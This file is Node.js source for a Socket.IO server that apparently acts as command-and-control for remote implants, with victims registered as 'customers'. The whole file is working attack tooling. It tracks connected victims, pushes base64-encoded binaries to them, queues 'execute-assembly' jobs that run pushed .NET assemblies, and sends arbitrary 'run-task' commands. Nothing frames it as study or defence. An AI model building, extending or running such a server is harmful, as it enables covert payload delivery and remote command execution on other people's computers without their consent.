const app = require('express')();
const http = require('http').Server(app);
const io = require('socket.io')(http);
const fs = require('fs');
const port = process.env.PORT || 3000;

app.get('/controller', (req, res) => {
  res.sendFile(__dirname + '/misery-controller.html');
});
app.get('/client', (req, res) => {
  res.sendFile(__dirname + '/misery-client.html');
});

var customers = [];

var controllers = io.of("/controller")
var clients = io.of("/client")

var queuedTasks = [];

controllers.on('connection', (socket) => {
  controllers.emit('connections', customers);
  socket.on('message', msg => {
    clients.emit('message', msg);
    console.log(msg);
  });
  socket.on('echo', msg => {
    var cust = customers.find(c => c.id == msg.id);
    if(cust){
      clients.to(cust.socketId).emit("echo", msg.message);
      console.log(cust.socketId + ": " + msg.message);
    }
  });

  socket.on('load', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      if(fs.existsSync(`./${msg.fileName}`)){
        
        binary = fs.readFileSync(`./${msg.fileName}`).toString('base64');
        clients.to(cust.socketId).emit("load", binary);
        console.log("Loaded: " + msg.fileName);
      }else{
        socket.emit('echo', 'File does not exist');
      }
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on("execute-assembly", msg => {
    var cust = customers.find(c => c.id == msg.id);
    var fileName = msg.args[0];
    if(cust){
      if(fs.existsSync(`./${fileName}`)){
        
        binary = fs.readFileSync(`./${fileName}`).toString('base64');
        queuedTasks.push({
          check: "Loaded " + fileName,
          cust: cust.socketId,
          args: msg.args
        })
        clients.to(cust.socketId).emit("load", binary);
        console.log("Loaded: " + fileName);
      }else{
        socket.emit('echo', 'File does not exist');
      }
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });

  socket.on('run-task', msg => {
    var cust = customers.find(c => c.id == msg.id);

    if(cust){
      clients.to(cust.socketId).emit("run-task", msg.args);
      console.log("Ran: " + msg.args);
    }else{
      socket.emit('echo', 'Invalid client');
    }
  });
});

clients.on('connection', (socket) => {
  console.log("new connection: " + socket.id);

  let startTime;

  setInterval(function() {
    startTime = Date.now();
    socket.emit('ping');
  }, 30000);

  socket.on('pong', function() {
    latency = Date.now() - startTime;
    controllers.emit('latency-update', {id: socket.id, latency});
  });

  socket.on('register', msg => {
    msg.socketId = socket.id;
    customers.push(msg);
    controllers.emit('connections', customers);
  });

  socket.on('disconnect', function() {
    console.log(socket.id + " disconnected");
    customers = customers.filter(c => c.socketId != socket.id);
    controllers.emit('connections', customers);
  });

  socket.on('echo', msg => {
    controllers.emit('echo', msg);

    var task = queuedTasks.find(t => msg == t.check && socket.id == t.cust);

    if(task){
      socket.emit("run-task", task.args);
      console.log("Ran: " + msg.args);
      queuedTasks = queuedTasks.filter(t => t != task);
    }
  });
});

http.listen(port, () => {
  console.log(`Socket.IO server running at http://localhost:${port}/`);
});
